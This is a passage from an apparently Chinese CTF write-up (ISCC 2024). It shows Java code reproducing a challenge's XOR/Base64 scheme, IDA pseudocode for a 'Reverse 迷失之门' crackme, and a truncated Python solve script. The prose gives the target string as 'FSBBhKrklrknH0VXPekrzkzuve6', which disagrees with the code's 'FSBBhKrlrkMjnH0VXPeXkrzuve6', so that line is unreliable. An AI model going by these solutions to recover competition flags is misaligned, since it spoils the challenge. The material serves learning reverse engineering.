class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">Receiver</span>&#123;<br>    private static final <span class="hljs-built_in">int</span> SALT_LENGTH = <span class="hljs-number">16</span>;<br><br>    public static void main(String[] args) &#123;<br>        String stringExtra = <span class="hljs-string">&quot;04999999&quot;</span>;<br>        String stringExtra2 = <span class="hljs-string">&quot;gwC9nOCNUhsHqZm&quot;</span>;<br>        String sha256 = getSHA256(stringExtra + stringExtra2);<br>        <span class="hljs-keyword">if</span> (stringExtra == null || stringExtra2 == null || !sha256.equals(<span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        String encrypted = encrypt2(encrypt(stringExtra, stringExtra2));<br>        System.out.println(<span class="hljs-string">&quot;Encrypted (first 32 chars): &quot;</span> + encrypted.substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>));<br>        // Demonstrating decryption<br>//        String decrypted = decrypt(decrypt2(encrypted));<br>//        System.out.println(<span class="hljs-string">&quot;Decrypted: &quot;</span> + decrypted);<br>    &#125;<br><br>    public static String encrypt(String <span class="hljs-built_in">str</span>, String str2) &#123;<br>        byte[] generateSalt = generateSalt(<span class="hljs-number">16</span>);<br>        byte[] customEncrypt = customEncrypt(combineStrings(<span class="hljs-built_in">str</span>, str2).getBytes(StandardCharsets.UTF_8), generateSalt);<br>        byte[] bArr = new byte[generateSalt.length + customEncrypt.length];<br>        System.arraycopy(generateSalt, <span class="hljs-number">0</span>, bArr, <span class="hljs-number">0</span>, generateSalt.length);<br>        System.arraycopy(customEncrypt, <span class="hljs-number">0</span>, bArr, generateSalt.length, customEncrypt.length);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bArr);<br>    &#125;<br><br>    public static String decrypt(String <span class="hljs-built_in">str</span>) &#123;<br>        byte[] decode = Base64.getDecoder().decode(<span class="hljs-built_in">str</span>);<br>        byte[] bArr = new byte[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">int</span> length = decode.length - <span class="hljs-number">16</span>;<br>        byte[] bArr2 = new byte[length];<br>        System.arraycopy(decode, <span class="hljs-number">0</span>, bArr, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>        System.arraycopy(decode, <span class="hljs-number">16</span>, bArr2, <span class="hljs-number">0</span>, length);<br>        <span class="hljs-keyword">return</span> new String(customDecrypt(bArr2, bArr), StandardCharsets.UTF_8);<br>    &#125;<br><br>    private static byte[] generateSalt(<span class="hljs-built_in">int</span> i) &#123;<br>        byte[] bArr = new byte[i];<br>        new Random(<span class="hljs-number">5733L</span>).nextBytes(bArr);<br>        <span class="hljs-keyword">return</span> bArr;<br>    &#125;<br><br>    private static String combineStrings(String <span class="hljs-built_in">str</span>, String str2) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span> + str2;<br>    &#125;<br><br>    private static byte[] customEncrypt(byte[] bArr, byte[] bArr2) &#123;<br>        byte[] bArr3 = new byte[bArr.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; bArr.length; i++) &#123;<br>            bArr3[i] = (byte) (bArr[i] ^ bArr2[i % bArr2.length]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> bArr3;<br>    &#125;<br><br>    private static byte[] customDecrypt(byte[] bArr, byte[] bArr2) &#123;<br>        <span class="hljs-keyword">return</span> customEncrypt(bArr, bArr2);<br>    &#125;<br><br>    public static String encrypt2(String <span class="hljs-built_in">str</span>) &#123;<br>        byte[] <span class="hljs-built_in">bytes</span> = <span class="hljs-built_in">str</span>.getBytes(StandardCharsets.UTF_8);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">bytes</span>.length; i++) &#123;<br>            <span class="hljs-built_in">bytes</span>[i] = (byte) ((<span class="hljs-built_in">bytes</span>[i] + Byte.MAX_VALUE) % <span class="hljs-number">256</span>);<br>        &#125;<br>        byte[] bArr = new byte[<span class="hljs-built_in">bytes</span>.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i2 = <span class="hljs-number">0</span>; i2 &lt; <span class="hljs-built_in">bytes</span>.length; i2++) &#123;<br>            bArr[i2] = (byte) (i2 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? <span class="hljs-built_in">bytes</span>[i2] ^ <span class="hljs-number">123</span> : <span class="hljs-built_in">bytes</span>[i2] ^ <span class="hljs-number">234</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bArr);<br>    &#125;<br><br>    public static String decrypt2(String <span class="hljs-built_in">str</span>) &#123;<br>        byte[] decode = Base64.getDecoder().decode(<span class="hljs-built_in">str</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; decode.length; i++) &#123;<br>            decode[i] = (byte) (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? decode[i] ^ <span class="hljs-number">123</span> : decode[i] ^ <span class="hljs-number">234</span>);<br>        &#125;<br>        byte[] bArr = new byte[decode.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i2 = <span class="hljs-number">0</span>; i2 &lt; decode.length; i2++) &#123;<br>            bArr[i2] = (byte) ((decode[i2] + <span class="hljs-number">129</span>) % <span class="hljs-number">256</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> new String(bArr, StandardCharsets.UTF_8);<br>    &#125;<br><br>    public static String getSHA256(String <span class="hljs-built_in">str</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            MessageDigest messageDigest = MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-256&quot;</span>);<br>            messageDigest.update(<span class="hljs-built_in">str</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            <span class="hljs-keyword">return</span> byte2Hex(messageDigest.digest());<br>        &#125; catch (UnsupportedEncodingException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125; catch (NoSuchAlgorithmException e2) &#123;<br>            e2.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    private static String byte2Hex(byte[] bArr) &#123;<br>        StringBuffer stringBuffer = new StringBuffer();<br>        <span class="hljs-keyword">for</span> (byte b : bArr) &#123;<br>            String hexString = Integer.toHexString(b &amp; <span class="hljs-number">0xFF</span>);<br>            <span class="hljs-keyword">if</span> (hexString.length() == <span class="hljs-number">1</span>) &#123;<br>                stringBuffer.append(<span class="hljs-string">&quot;0&quot;</span>);<br>            &#125;<br>            stringBuffer.append(hexString);<br>        &#125;<br>        <span class="hljs-keyword">return</span> stringBuffer.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="Reverse-迷失之门"><a href="#Reverse-迷失之门" class="headerlink" title="Reverse 迷失之门"></a>Reverse 迷失之门</h4><p>IDAx64 打开，查看 main 函数伪代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">main</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> Buffer[<span class="hljs-number">267</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+12Bh] [rbp+ABh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+12Ch] [rbp+ACh]</span><br><br>  _main(argc, argv, envp);<br>  v3 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, &amp;unk_140004023);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>  <span class="hljs-built_in">gets_s</span>(Buffer, <span class="hljs-number">260u</span>i64);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Buffer) &lt;= <span class="hljs-number">27</span> )<br>  &#123;<br>    v7 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">5</span>; i &lt;= <span class="hljs-number">25</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">islower</span>(Buffer[i]) &amp;&amp; Buffer[i] != <span class="hljs-number">95</span> )<br>        v7 = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">check</span>(Buffer);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, &amp;unk_14000402E);<br>    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>发现调用了 check 函数进行检查，实现了对输入字符串的解密和验证，先初始化了三个字符串和解密密钥，然后遍历输入字符串 a1，对于每个字符 a1 [i]，如果字符不是空格或不可打印字符，再计算 v22 &#x3D; a1 [i] - v3 [i]，然后根据 v22 的值，从 v16，v10 或 v4 中选择对应的字符替换 a1 [i]</p>
<p>最后又调用了 check_2 函数对解密后的字符串再一次进行验证</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall check(char *a1)<br>&#123;<br>  char v1; // al<br>  char v3[32]; // [rsp+20h] [rbp-60h] BYREF<br>  _DWORD v4[8]; // [rsp+40h] [rbp-40h] BYREF<br>  __int64 v5; // [rsp+60h] [rbp-20h]<br>  __int64 v6; // [rsp+68h] [rbp-18h]<br>  __int64 v7; // [rsp+70h] [rbp-10h]<br>  __int64 v8; // [rsp+78h] [rbp-8h]<br>  char v9; // [rsp+80h] [rbp+0h]<br>  _DWORD v10[8]; // [rsp+90h] [rbp+10h] BYREF<br>  __int64 v11; // [rsp+B0h] [rbp+30h]<br>  __int64 v12; // [rsp+B8h] [rbp+38h]<br>  __int64 v13; // [rsp+C0h] [rbp+40h]<br>  __int64 v14; // [rsp+C8h] [rbp+48h]<br>  char v15; // [rsp+D0h] [rbp+50h]<br>  _DWORD v16[8]; // [rsp+E0h] [rbp+60h] BYREF<br>  __int64 v17; // [rsp+100h] [rbp+80h]<br>  __int64 v18; // [rsp+108h] [rbp+88h]<br>  __int64 v19; // [rsp+110h] [rbp+90h]<br>  __int64 v20; // [rsp+118h] [rbp+98h]<br>  char v21; // [rsp+120h] [rbp+A0h]<br> <span class="hljs-built_in"> int </span>v22; // [rsp+124h] [rbp+A4h]<br> <span class="hljs-built_in"> int </span>v23; // [rsp+128h] [rbp+A8h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+12Ch] [rbp+ACh]<br><br>  strcpy((char *)v16, <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);<br>  HIBYTE(v16[6]) = 0;<br>  v16[7] = 0;<br>  v17 = 0i64;<br>  v18 = 0i64;<br>  v19 = 0i64;<br>  v20 = 0i64;<br>  v21 = 0;<br>  strcpy((char *)v10, <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>);<br>  HIBYTE(v10[6]) = 0;<br>  v10[7] = 0;<br>  v11 = 0i64;<br>  v12 = 0i64;<br>  v13 = 0i64;<br>  v14 = 0i64;<br>  v15 = 0;<br>  strcpy((char *)v4, <span class="hljs-string">&quot;0123456789+/-=!#&amp;*()?;:*^%&quot;</span>);<br>  HIBYTE(v4[6]) = 0;<br>  v4[7] = 0;<br>  v5 = 0i64;<br>  v6 = 0i64;<br>  v7 = 0i64;<br>  v8 = 0i64;<br>  v9 = 0;<br>  strcpy(v3, <span class="hljs-string">&quot;DABBZXQESVFRWNGTHYJUMKIOLPC&quot;</span>);<br>  v23 = strlen(a1);<br>  for ( i = 0; i &lt; v23; ++i )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( a1[i] != 127 &amp;&amp; a1[i] &gt; 32 )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( a1[i] - v3[i] &lt;= 0 )<br>      &#123;<br>        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;flag is wrong&quot;</span>);<br>      &#125;<br>      else<br>      &#123;<br>        v22 = a1[i] - v3[i];<br>       <span class="hljs-built_in"> if </span>( v22 &gt; 25 )<br>        &#123;<br>         <span class="hljs-built_in"> if </span>( v22 &gt; 51 )<br>            v1 = *((_BYTE *)&amp;v4[-13] + v22);<br>          else<br>            v1 = *((_BYTE *)&amp;v10[-6] + v22 - 2);<br>          a1[i] = v1;<br>        &#125;<br>        else<br>        &#123;<br>          a1[i] = *((_BYTE *)v16 + v22);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br> <span class="hljs-built_in"> return </span>check_2(a1);<br>&#125;<br></code></pre></td></tr></table></figure>



<p>在 check2 中，验证解密后的字符串，并输出提示信息。</p>
<p>从 a1 的第一个字符开始，依次检查每个字符是否与特定字符串 “FSBBhKrklrknH0VXPekrzkzuve6” 的对应位置字符相同，为此使用了大量的 if 语句嵌套进行字符比较。如果所有字符都匹配，则说明解密成功，输出 “yes, this is a flag\n”，否则，函数直接返回，没有输出任何信息。如果解密成功，则调用 getchar() 等待用户输入，并将其作为函数的返回值。</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs lisp">int __fastcall check_2(<span class="hljs-name">char</span> *a1)<br>&#123;<br>  int result; // eax<br><br>  result = (unsigned __int8)*a1<span class="hljs-comment">;</span><br>  if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">70</span> )<br>  &#123;<br>    result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>    if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">83</span> )<br>    &#123;<br>      result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">2</span>]<span class="hljs-comment">;</span><br>      if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">66</span> )<br>      &#123;<br>        result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">3</span>]<span class="hljs-comment">;</span><br>        if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">66</span> )<br>        &#123;<br>          result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>          if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">104</span> )<br>          &#123;<br>            result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">5</span>]<span class="hljs-comment">;</span><br>            if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">75</span> )<br>            &#123;<br>              result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">6</span>]<span class="hljs-comment">;</span><br>              if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">114</span> )<br>              &#123;<br>                result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">7</span>]<span class="hljs-comment">;</span><br>                if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">108</span> )<br>                &#123;<br>                  result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">8</span>]<span class="hljs-comment">;</span><br>                  if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">114</span> )<br>                  &#123;<br>                    result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">9</span>]<span class="hljs-comment">;</span><br>                    if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">107</span> )<br>                    &#123;<br>                      result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">10</span>]<span class="hljs-comment">;</span><br>                      if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">77</span> )<br>                      &#123;<br>                        result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">11</span>]<span class="hljs-comment">;</span><br>                        if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">106</span> )<br>                        &#123;<br>                          result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">12</span>]<span class="hljs-comment">;</span><br>                          if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">110</span> )<br>                          &#123;<br>                            result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">13</span>]<span class="hljs-comment">;</span><br>                            if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">72</span> )<br>                            &#123;<br>                              result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">14</span>]<span class="hljs-comment">;</span><br>                              if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">48</span> )<br>                              &#123;<br>                                result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">15</span>]<span class="hljs-comment">;</span><br>                                if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">86</span> )<br>                                &#123;<br>                                  result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">16</span>]<span class="hljs-comment">;</span><br>                                  if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">88</span> )<br>                                  &#123;<br>                                    result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">17</span>]<span class="hljs-comment">;</span><br>                                    if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">80</span> )<br>                                    &#123;<br>                                      result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">18</span>]<span class="hljs-comment">;</span><br>                                      if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">101</span> )<br>                                      &#123;<br>                                        result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">19</span>]<span class="hljs-comment">;</span><br>                                        if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">88</span> )<br>                                        &#123;<br>                                          result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">20</span>]<span class="hljs-comment">;</span><br>                                          if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">107</span> )<br>                                          &#123;<br>                                            result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">21</span>]<span class="hljs-comment">;</span><br>                                            if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">114</span> )<br>                                            &#123;<br>                                              result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">22</span>]<span class="hljs-comment">;</span><br>                                              if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">122</span> )<br>                                              &#123;<br>                                                result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">23</span>]<span class="hljs-comment">;</span><br>                                                if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">117</span> )<br>                                                &#123;<br>                                                  result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">24</span>]<span class="hljs-comment">;</span><br>                                                  if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">118</span> )<br>                                                  &#123;<br>                                                    result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">25</span>]<span class="hljs-comment">;</span><br>                                                    if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">101</span> )<br>                                                    &#123;<br>                                                      result = (<span class="hljs-name">unsigned</span> __int8)a1[<span class="hljs-number">26</span>]<span class="hljs-comment">;</span><br>                                                      if ( (<span class="hljs-name">_BYTE</span>)result == <span class="hljs-number">54</span> )<br>                                                      &#123;<br>                                                        std:<span class="hljs-symbol">:operator&lt;&lt;&lt;std</span>:<span class="hljs-symbol">:char_traits&lt;char&gt;&gt;</span>(<br>                                                          <span class="hljs-name">refptr__ZSt4cout</span>,<br>                                                          <span class="hljs-string">&quot;yes, this is a flag\n&quot;</span>)<span class="hljs-comment">;</span><br>                                                        return getchar()<span class="hljs-comment">;</span><br>                                                      &#125;<br>                                                    &#125;<br>                                                  &#125;<br>                                                &#125;<br>                                              &#125;<br>                                            &#125;<br>                                          &#125;<br>                                        &#125;<br>                                      &#125;<br>                                    &#125;<br>                                  &#125;<br>                                &#125;<br>                              &#125;<br>                            &#125;<br>                          &#125;<br>                        &#125;<br>                      &#125;<br>                    &#125;<br>                  &#125;<br>                &#125;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  return result<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>



<p><img src="../../../../img/archives/2024ISCC05/3df9dfc634cefbf1e1d86da3735b2b03.png" srcset="/img/loading.gif" lazyload> 根据代码逻辑，编写 exp 进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-string">&quot;FSBBhKrlrkMjnH0VXPeXkrzuve6&quot;</span>  <br>key = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">b&quot;DABBZXQESVFRWNGTHYJUMKIOLPC&quot;</span>]  <br>index = []  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:  <br> <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:  <br> index.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>.index(i))  <br> <span class="hljs-keyword">elif</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>:  <br> index.append(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>.index(i) + <span class="hljs-number">26</span>)  <br> <span class="hljs-keyword">elif</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789+/-=!\#&amp;\*()?;:\*\^%&quot;</span>:  <br> index.append(<span class="hljs-string">&quot;0123456789+/-=!\#&amp;\*()?;:\*\^%&quot;</span>.index(i) + <span 